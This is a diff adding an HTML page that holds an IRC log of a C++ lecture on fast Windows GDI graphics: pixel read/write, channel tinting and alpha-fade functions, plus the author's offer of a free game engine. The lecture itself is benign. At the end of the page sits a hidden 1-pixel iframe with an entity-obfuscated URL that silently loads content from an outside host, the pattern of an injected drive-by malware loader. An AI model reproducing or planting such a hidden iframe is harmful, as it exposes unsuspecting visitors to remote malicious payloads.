@@ -1,0 +1,431 @@
+<HTML>
+<HEAD>
+   <TITLE>The C++ Multimedia Lecture</TITLE>
+</HEAD>
+<BODY>
+<br>
+<CENTER>
+<HR SIZE=1 NOSHADE WIDTH="45%">
+
+C++ Multimedia Lecture<br>
+
+by Raymond<br>
+
+For <A HREF="http://blacksun.box.sk">Blacksun Research Facility
+[BSRF]</A><br>
+
+<A HREF="http://blacksun.box.sk">http://blacksun.box.sk</A><br>
+
+
+<HR SIZE=1 NOSHADE WIDTH="56%"></CENTER><br>
+
+
+<P>- Source Code to FLARE.H and documentation can be downloaded in zip
+format from <A HREF="http://blacksun.box.sk/tutorials/FLARE-1.0.zip">http://blacksun.box.sk/tutorials/FLARE-1.0.zip</A>
+
+<P>&lt;blitz> led raymon talk
+<BR>&lt;Pecca-ve> so you learned c++
+<BR>&lt;Raymond> so i learned alot about the graphical functions in the
+gdi32.dll
+<BR>&lt;Raymond> and then i learned C++
+<BR>&lt;Raymond> one of the most powerfull functions in gdi32 is BitBlt
+or StrechBlt
+<BR>&lt;Raymond> most C++ windows prgramers have used it
+<BR>&lt;ArSeNiC> i wanna learn c++ ray, Any advice fer me?
+<BR>&lt;pitpat-> keep quiet arsenic
+<BR>&lt;Raymond> yes, think very structured
+<BR>&lt;Raymond> =)
+<BR>&lt;Pecca-ve> read alot
+<BR>&lt;Pecca-ve> lecture
+<BR>&lt;blitz> LET RAY TALK THEN QUESTIONS
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+-- Lecture seriously begins approx. here --
+<BR>&lt;Raymond> what BitBlt and stretchblt do
+<BR>&lt;Raymond> is copy rectangkles of image data to other Device Contexts
+<BR>*** rek has joined #bsrf
+<BR>*** ChanServ sets mode: +o rek
+<BR>&lt;Raymond> this can be the basis for bitmaped image output
+<BR>*** snider sets mode: +v Raymond
+<BR>*** rek is now known as rek[away]
+<BR>&lt;Pecca-ve> then what?
+<BR>&lt;blitz> ?
+<BR>&lt;Raymond> while bitblt is considerd a fast function
+<BR>&lt;pitpat-> what include do we need for BitBlt and stretchblt?
+<BR>&lt;Raymond> it can become very slow when not used in an acceptable
+fashion
+<BR>*** Skulker has joined #bsrf
+<BR>&lt;Raymond> btiblt and stretchblt can be accesed thru win32 by the
+windows.h
+<BR>&lt;Raymond> and should not require and lib inclusion
+<BR>&lt;ArSeNiC> hey, why aint you nice 2 newbies to your server
+<BR>&lt;Raymond> now, to get back to the begining on windows and graphics
+<BR>&lt;ArSeNiC> just cause i dont know c/c++ doesnt mean i dunno unix
+syntax
+<BR>&lt;Raymond> windows by nature is slow graphicly
+<BR>&lt;Raymond> but widnows has many ways to exploit fast image routines
+<BR>&lt;Raymond> oen feature is the windows DIB object
+<BR>&lt;Raymond> it stands for Device Indipendant Bitmap
+<BR>*** rxcv has joined #bsrf
+<BR>&lt;Raymond> and it simply stores logical image data in ram
+<BR>&lt;Raymond> not in video memeory
+<BR>* pitpat- nods
+<BR>&lt;Raymond> this is a very important feature
+<BR>&lt;Raymond> becsaue yuo can aquire a pointer to the image data's bytes
+<BR>*** rxcv Quit (Not enough time connected)
+<BR>*** DeadKro1 has joined #bsrf
+<BR>&lt;Raymond> and do extreamly fast image manipultions with that pointer
+<BR>*** rxcv&nbsp; has joined #bsrf
+<BR>&lt;Raymond> this can be as simple as ploting pixels
+<BR>*** DHamster&nbsp; has joined #bsrf
+<BR>&lt;Raymond> or as complex as drawing an overlayed sine wave on an
+image to produce the effect of water
+<BR>&lt;devin> Does anyone know the PHP header function to that'll seamlessly
+change URL's?
+<BR>&lt;devin> I can't find it.
+<BR>&lt;pitpat-> shhhh devin
+<BR>&lt;pitpat-> lecture
+<BR>&lt;DHamster> hiwo all agian
+<BR>&lt;Raymond> im now going to ask everyone if they have a certain direction
+they would like me to go with this lecture
+<BR>&lt;Raymond> be it game specific
+<BR>&lt;blitz> please continute ray
+<BR>&lt;Raymond> or multimedia specific
+<BR>&lt;pitpat-> multimedia ray
+<BR>*** DHamster is now known as _Dhamster-
+<BR>&lt;pitpat-> show us a little coding
+<BR>&lt;Pecca-ve> game?
+<BR>&lt;Raymond> is that hunanomous?
+<BR>&lt;Mtcx> game
+<BR>&lt;pitpat-> ok game
+<BR>&lt;Raymond> ok game it is
+<BR>*** devin has left #bsrf
+<BR>&lt;Raymond> i will now shwo you a fucntion that i use for extramly
+fast pixel manipulation
+<BR>&lt;Raymond> please wait...
+<BR>* pitpat- holds
+<BR>&lt;Raymond> ok, sorry for the wait
+<BR>&lt;Raymond> void __forceinline WritePixel(signed long x,signed long
+y,FC_Image *lpImage,FS_Color *lpColor)
+<BR>&lt;Raymond> {
+<BR>&lt;Raymond>&nbsp; if(x>-1&amp;&amp;y>-1&amp;&amp;x&lt;lpImage->ImageWidth&amp;&amp;y&lt;lpImage->ImageHeight)
+<BR>&lt;Raymond>&nbsp; {
+<BR>&lt;Raymond>&nbsp;&nbsp; unsigned char *lpByte=(unsigned char*)&amp;lpImage->lpImagePixels[y*lpImage->ImageWidth+x];
+<BR>&lt;Raymond>&nbsp;&nbsp; *lpByte=lpColor->B;
+<BR>&lt;Raymond>&nbsp;&nbsp; lpByte++;
+<BR>&lt;Raymond>&nbsp;&nbsp; *lpByte=lpColor->G;
+<BR>&lt;Raymond>&nbsp;&nbsp; lpByte++;
+<BR>&lt;Raymond>&nbsp;&nbsp; *lpByte=lpColor->R;
+<BR>&lt;Raymond>&nbsp; }
+<BR>&lt;Raymond> }
+<BR>&lt;Raymond> this function writes a single 24 bit color pointer into
+an existing image
+<BR>&lt;rek[away]> Raymond: try pvting it to him next time (chan flood...)
+<BR>&lt;snider> rek
+<BR>&lt;snider> its a lecture
+<BR>&lt;pitpat-> it's lecture
+<BR>&lt;rek[away]> opps
+<BR>&lt;Raymond> the advantage of using this fucntion over the well known
+function SetPixel
+<BR>&lt;Raymond> is that is is extramly fast in comparison
+<BR>&lt;Raymond> SetPixel does alot of color table matching in the background
+<BR>&lt;ElfQrin> hehe... luckily rek didn't kicked Raymond as a warning
+;)
+<BR>&lt;Raymond> and simply will not do for graphical manipulation
+<BR>&lt;Raymond> hehe
+<BR>&lt;Raymond> the same method can be applied to extract a pixel from
+an image
+<BR>&lt;Raymond> void __forceinline ReadPixel(signed long x,signed long
+y,FC_Image *lpImage,FS_Color *lpColor)
+<BR>&lt;Raymond> {
+<BR>&lt;Raymond>&nbsp; if(x>-1&amp;&amp;y>-1&amp;&amp;x&lt;lpImage->ImageWidth&amp;&amp;y&lt;lpImage->ImageHeight)
+<BR>&lt;Raymond>&nbsp; {
+<BR>&lt;Raymond>&nbsp;&nbsp; unsigned char *lpByte=(unsigned char*)&amp;lpImage->lpImagePixels[y*lpImage->ImageWidth+x];
+<BR>&lt;Raymond>&nbsp;&nbsp; lpColor->B=*lpByte;
+<BR>&lt;Raymond>&nbsp;&nbsp; lpByte++;
+<BR>&lt;Raymond>&nbsp;&nbsp; lpColor->G=*lpByte;
+<BR>&lt;Raymond>&nbsp;&nbsp; lpByte++;
+<BR>&lt;Raymond>&nbsp;&nbsp; lpColor->R=*lpByte;
+<BR>&lt;Raymond>&nbsp; }
+<BR>&lt;Raymond> }
+<BR>&lt;Raymond> note that out-of-bounds checking is done in thsi function
+<BR>*** DeadKro1 (Fux4r@64.40.167.BOX-3589) Quit (Read error: 113 (No route
+to host))
+<BR>&lt;Raymond> makign higher level functions that use this one, not have
+to haev such a check
+<BR>&lt;Raymond> one thing that i always hear people saying
+<BR>&lt;Raymond> is how they want to perform animation on a window
+<BR>&lt;Raymond> short of using an avi file
+<BR>&lt;Raymond> you can splice together all of your animation frames
+<BR>&lt;Raymond> into one bitmap
+<BR>&lt;pitpat-> :)
+<BR>&lt;Raymond> load it into an HBITMAP using the LoadImageFunction
+<BR>&lt;Raymond> and use BitBlt to actualy clip out
+<BR>&lt;Raymond> and draw
+<BR>&lt;Raymond> induvidual frames
+<BR>&lt;Raymond> onto a window's device context
+<BR>&lt;Raymond> another common question i hear is that they want to draw
+images that have certain colors extracted
+<BR>&lt;Raymond> i haev made a routine for this..pleae wait
+<BR>*** hehe (hehe@BOX-24664.navipath.net) has joined #bsrf
+<BR>*** hehe is now known as Raymond_2
+<BR>&lt;pitpat-> ...
+<BR>&lt;ElfQrin> The lecture's not bad but I need to sleep (3:21am here),
+if someone would e-mail it to me, I'd appreciate it.
+<BR>&lt;Raymond_2> sorry about that io lost my connection
+<BR>&lt;Raymond_2> void ImageTint(FC_Image *lpImage,bool RedOFF,bool GreenOFF,bool
+BlueOFF)
+<BR>&lt;Raymond_2> {
+<BR>&lt;Raymond_2>&nbsp; unsigned long i=0;
+<BR>&lt;Raymond_2>&nbsp; unsigned char *lpPixelByte=(unsigned char*)lpImage->lpImagePixels;
+<BR>&lt;Raymond_2>&nbsp; while(i&lt;lpImage->ImageSizePixels)
+<BR>&lt;Raymond_2>&nbsp; {
+<BR>&lt;blitz> its ok
+<BR>&lt;Raymond_2>&nbsp;&nbsp; if(BlueOFF)*lpPixelByte=0;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; lpPixelByte++;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; if(GreenOFF)*lpPixelByte=0;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; lpPixelByte++;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; if(RedOFF)*lpPixelByte=0;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; lpPixelByte++;
+<BR>*** Skulker is now known as Rimmag
+<BR>&lt;Raymond_2>&nbsp;&nbsp; i++;
+<BR>&lt;Raymond_2>&nbsp; }
+<BR>&lt;Raymond_2>&nbsp; return;
+<BR>&lt;Raymond_2> }
+<BR>&lt;Raymond_2> this function allows you to turn off the color channels
+or an image
+<BR>&lt;Raymond_2> *of
+<BR>*** MOOCOWMOO has joined #BSRF
+<BR>&lt;Raymond_2> the function that i have that is similar to this
+<BR>&lt;MOOCOWMOO> hrmm....
+<BR>&lt;Raymond_2> is for alphablending
+<BR>&lt;pitpat-> nice ray
+<BR>&lt;MOOCOWMOO> i think i cracked that wargame thing
+<BR>&lt;Raymond_2> void ImageFade(FC_Image *lpImage,FS_Color *lpColor,unsigned
+char Alpha)
+<BR>&lt;Raymond_2> {
+<BR>&lt;Raymond_2>&nbsp; unsigned long i=0;
+<BR>&lt;Raymond_2>&nbsp; unsigned char *lpByte=(unsigned char*)lpImage->lpImagePixels;
+<BR>&lt;Raymond_2>&nbsp; while(i&lt;lpImage->ImageSizePixels)
+<BR>&lt;Raymond_2>&nbsp; {
+<BR>*** Raymond (hehe@BOX-23318.navipath.net) Quit (Ping timeout: 180 seconds)
+<BR>&lt;MOOCOWMOO> ther's an ftp running on port 21
+<BR>&lt;Raymond_2>&nbsp;&nbsp; *lpByte=(Alpha*(lpColor->B-*lpByte)>>8)+*lpByte;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; lpByte++;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; *lpByte=(Alpha*(lpColor->G-*lpByte)>>8)+*lpByte;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; lpByte++;
+<BR>&lt;MOOCOWMOO> hey
+<BR>&lt;Raymond_2>&nbsp;&nbsp; *lpByte=(Alpha*(lpColor->R-*lpByte)>>8)+*lpByte;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; lpByte++;
+<BR>&lt;Raymond_2>&nbsp;&nbsp; i++;
+<BR>&lt;MOOCOWMOO> can someone here teach me BNC real quick?
+<BR>&lt;Raymond_2>&nbsp; }
+<BR>&lt;Raymond_2>&nbsp; return;
+<BR>&lt;MOOCOWMOO> or how to use it
+<BR>&lt;Raymond_2> }
+<BR>&lt;Raymond_2> this will put an overall color shade on an image
+<BR>&lt;pitpat-> moocow we have a lecture
+<BR>&lt;Mtcx> yeah, sh
+<BR>&lt;MOOCOWMOO> ok i b quiet
+<BR>&lt;Raymond_2> hehe,
+<BR>*** rek[away]&nbsp; Quit (Quit: )
+<BR>&lt;Raymond_2> so, getting back to the story
+<BR>&lt;Raymond_2> after about two years of research
+<BR>&lt;ElfQrin> good nite, if someone could remember that please mail
+this lecture to me when it'll be finished.
+<BR>&lt;ElfQrin> cya
+<BR>&lt;Raymond_2> ive finaly come up with a very advanced multimedia and
+game development engine
+<BR>&lt;pitpat-> cya elf
+<BR>&lt;snider> nitey nite
+<BR>&lt;Raymond_2> it sport's it's own image type called the GMB
+<BR>*** ElfQrin&nbsp; has left #bsrf
+<BR>&lt;Raymond_2> and has the option of RLE compression
+<BR>&lt;Raymond_2> in some cases, for animation streams
+<BR>&lt;Raymond_2> compresion can be as high as 12 mb file to 2 mb file
+<BR>*** Red_Death is now known as Smoking_Death
+<BR>*** _sangoma-&nbsp; has joined #bsrf
+<BR>&lt;Raymond_2> the engine also supports an object framework
+<BR>&lt;Raymond_2> for creating buttons scrollbars
+<BR>&lt;Raymond_2> windows
+<BR>&lt;Raymond_2> and the custom objects that are used in the engine
+<BR>&lt;Raymond_2> those being..
+<BR>&lt;Raymond_2> Actor2D
+<BR>&lt;Raymond_2> Actor3D
+<BR>&lt;Raymond_2> HotSpot
+<BR>&lt;Raymond_2> SpotLight
+<BR>&lt;Raymond_2> and zBuffer object
+<BR>&lt;Raymond_2> the real power of this lecture is in that i am going
+to distribute my engine to anyone who wants it
+<BR>&lt;Raymond_2> free of charge
+<BR>*** essex Quit ()
+<BR>&lt;blitz> i want it
+<BR>&lt;Raymond_2> and to do with whatever you like
+<BR>&lt;pitpat-> i have it
+<BR>&lt;pitpat-> hehe
+<BR>&lt;pitpat-> ;)
+<BR>&lt;Raymond_2> but, obviously
+<BR>&lt;Raymond_2> ther is no warently impiled
+<BR>&lt;blitz> k
+<BR>&lt;Raymond_2> and you face all conciquences of using it
+<BR>&lt;pitpat-> yea pay respect to ray if you use it
+<BR>&lt;blitz> k
+<BR>&lt;pitpat-> he spent 2 years developing it
+<BR>&lt;Raymond_2> a comment about me would be nice
+<BR>&lt;Raymond_2> but not totaly neccisary
+<BR>&lt;Raymond_2> i simply want the people in the world to have the best
+tools possible
+<BR>&lt;NemoH> ray: what's the advantage of doing this vs using something
+like directx or opengl?
+<BR>&lt;Raymond_2> the advantage of using my engine over DX or opengl
+<BR>&lt;Raymond_2> is that the software rendering that it does
+<BR>&lt;Raymond_2> is faster that the software rendering of directx
+<BR>&lt;Raymond_2> while it doesn nor support hardware modes
+<BR>&lt;Raymond_2> *not
+<BR>&lt;Raymond_2> it also requires no dependency
+<BR>&lt;Raymond_2> otehr than what win32 already has
+<BR>*** sheepnus&nbsp; has joined #bsrf
+<BR>&lt;blitz> so with those tools I ll have almost everything right?
+<BR>&lt;Raymond_2> and the functionaly was built very moduarly
+<BR>&lt;Raymond_2> so you coudl adapt it to directX
+<BR>&lt;NemoH> ray: well it's definitely tied to win32
+<BR>&lt;Raymond_2> with the file i am going to distribute
+<BR>&lt;Raymond_2> definetly
+<BR>&lt;Raymond_2> if you haev MSVC++ 6.0
+<BR>&lt;Raymond_2> you can use this engine
+<BR>&lt;Raymond_2> it may be possible to use it on other compilers
+<BR>&lt;Raymond_2> but i havent tested it on such
+<BR>&lt;Raymond_2> the engine has been tested on win95, 98, me and 2k
+<BR>&lt;NemoH> and do you support all of the operation that directx does
+or do they need to be implemented
+<BR>&lt;Raymond_2> i doont suport all of what directx does
+<BR>&lt;Raymond_2> for instance
+<BR>&lt;Raymond_2> i dont support a rotation blt
+<BR>&lt;Raymond_2> or an alphablt
+<BR>*** Smoking_Death is now known as Red_Death
+<BR>&lt;Raymond_2> but ther implementation can be very easily worked into
+the existing class structure
+<BR>&lt;Raymond_2> sicne bitmaped images are handled in the FC_Image Class
+<BR>&lt;Raymond_2> and all other functions take a pointer to an FC Image
+<BR>&lt;Raymond_2> ther is lots of base functionalty
+<BR>&lt;Raymond_2> and lots of room for expansion
+<BR>&lt;Raymond_2> the best part of the engine tho
+<BR>&lt;Raymond_2> and actualy that part that i almost didnt wana give
+away
+<BR>&lt;Raymond_2> is that it has a multichannel audio mixer
+<BR>&lt;Raymond_2> for async wave file play
+<BR>&lt;pitpat-> :)
+<BR>&lt;Raymond_2> meaning that you could play up to 200 waves simultaniously
+<BR>&lt;pitpat-> :)
+<BR>&lt;pitpat-> yea that's alot
+<BR>*** Raymond_2 (hehe@BOX-24664.navipath.net) Quit (Read error: 104 (Connection
+reset by peer))
+<BR>&lt;pitpat-> oh no
+<BR>*** Raymond_2&nbsp; has joined #bsrf
+<BR>&lt;pitpat-> Raaaaayyyyyy!!!!!!1
+<BR>&lt;Raymond_2> =)
+<BR>&lt;pitpat-> lol peer took you away
+<BR>&lt;snider> hehe
+<BR>&lt;Raymond_2> so, without futher or do
+<BR>&lt;Raymond_2> im going to give the source to snider
+<BR>&lt;Raymond_2> and he will distribute it to those who want it&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+-- Look near end of file
+<BR>*** RealStony is now known as Stony
+<BR>&lt;pitpat-> ray
+<BR>&lt;blitz> k
+<BR>&lt;pitpat-> can i put it up on my site?
+<BR>&lt;pitpat-> people can go and grab it
+<BR>&lt;Mtcx> pitpat - where's you site
+<BR>&lt;Raymond_2> you can, but obviously it would be nice if you gave
+me a bit of credit on the site
+<BR>&lt;pitpat-> yea
+<BR>&lt;pitpat-> www.mmm69.com
+<BR>&lt;pitpat-> nothing yet
+<BR>&lt;blitz> ya
+<BR>&lt;Raymond_2> dont pass it off as your own, hve pride=)
+<BR>&lt;Raymond_2> lol
+<BR>&lt;pitpat-> don't worry ray
+<BR>&lt;Raymond_2> i will now take any questions on the engine or the lecture
+<BR>&lt;blitz> uhm...
+<BR>&lt;blitz> so this program your talking about it will go faster right?
+<BR>&lt;Raymond_2> it provies the fastest possible output from the base
+graphical system of windows
+<BR>&lt;Raymond_2> that is without using DirectX
+<BR>&lt;Raymond_2> or any other Library
+<BR>&lt;blitz> cool
+<BR>*** Trance has joined #bsrf
+<BR>*** ArSeNiC&nbsp; Quit (Quit: )
+<BR>&lt;Mtcx> so how do we get it?
+<BR>&lt;Raymond_2> it also supports the playing of avi movies and the like
+<BR>&lt;Raymond_2> im working with snider right now
+<BR>&lt;blitz> ok
+<BR>&lt;Mtcx> ok
+<BR>&lt;pitpat-> k
+<BR>*** Temp-nick is now known as AlienDaemon
+<BR>&lt;snider> i'll send it, if you need it right away. or you can pick
+it up from the lecture log (tomorrow)
+<BR>*** XarZ&nbsp; has joined #bsrf
+<BR>&lt;Mtcx> where will the lecture log be?
+<BR>&lt;Raymond_2> im also including the documentation for the engine
+<BR>&lt;Raymond_2> not it is incomplete
+<BR>&lt;Raymond_2> *note
+<BR>&lt;Raymond_2> but it will shed alot of light on the objects
+<BR>&lt;XarZ> damn....i missed a lecture
+<BR>&lt;blitz> well I wanna wait for the documentation when can i get it
+with everything?
+<BR>&lt;Raymond_2> and also
+<BR>&lt;Raymond_2> if ther becomes the need
+<BR>&lt;Raymond_2> and i get alot of intrest
+<BR>&lt;Raymond_2> let pitpat know about it
+<BR>&lt;Raymond_2> and he will get back to me
+<BR>&lt;pitpat-> :)
+<BR>&lt;Raymond_2> and maybe we can post some code samples of the engiens
+use on his page
+<BR>&lt;pitpat-> :)
+<BR>&lt;XarZ> what engine?
+<BR>&lt;pitpat-> anything you want ray
+<BR>&lt;XarZ> gfx?
+<BR>&lt;XarZ> kewl
+<BR>&lt;Raymond_2> multimedia engine
+<BR>&lt;Raymond_2> specialy developed for games
+<BR>&lt;XarZ> o
+<BR>&lt;XarZ> kewl
+<BR>&lt;Raymond_2> but can be used for multimedia
+<BR>&lt;XarZ> like a dX thing
+<BR>&lt;Raymond_2> and high quality sound and animations
+<BR>*** AciBiBeR Quit (Ping timeout: 180 seconds)
+<BR>&lt;Raymond_2> like dx, but it's standard win32
+<BR>&lt;Mtcx> so where will the lecture log be tomorrow, where we can download
+it?
+<BR>*** MurDoch&nbsp; has joined #bsrf
+<BR>&lt;pitpat-> Mtcx ask snider
+<BR>*** Antid0t&nbsp; has joined #bsrf
+<BR>&lt;Pecca-ve> snider?
+<BR>&lt;blitz> I think he's busy
+<BR>&lt;XarZ> well....the only thing i hate about dX is that u need the
+whole SDK to use it correctly...and those are lots of filez...
+<BR>&lt;snider> yeah i was gonna set up an auto-transfer script but what
+the hell
+<BR>&lt;pitpat-> snider are you gonna put it up on the site?
+<BR>&lt;snider> yes, but i don
+<BR>&lt;snider> err
+<BR>&lt;snider> don't have access, so mikkkeee will have to get it first
+<BR>*** _Dhamster-&nbsp; Quit (Quit: Leaving)
+<BR>&lt;Pecca-ve> bsrf&acute;s site?
+<BR>*** Antid0t&nbsp; Quit (Not enough time connected)
+<BR>&lt;snider> blacksun.box.sk&nbsp; yes
+<BR>*** MurDoch&nbsp; has left #bsrf
+<BR>&lt;Pecca-ve> k
+<BR>&lt;blitz> where's mikkkeee
+<BR>*** Jesteruk&nbsp; has joined #bsrf
+<BR>&lt;pitpat-> ray thanx for the lecture
+<BR>&lt;pitpat-> :)
+
+<P>---End of&nbsp; Lecture--
+<BR>&nbsp;
+<BR>&nbsp;
+<BR>&nbsp;
+<BR>&nbsp;
+<BR>&nbsp;
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
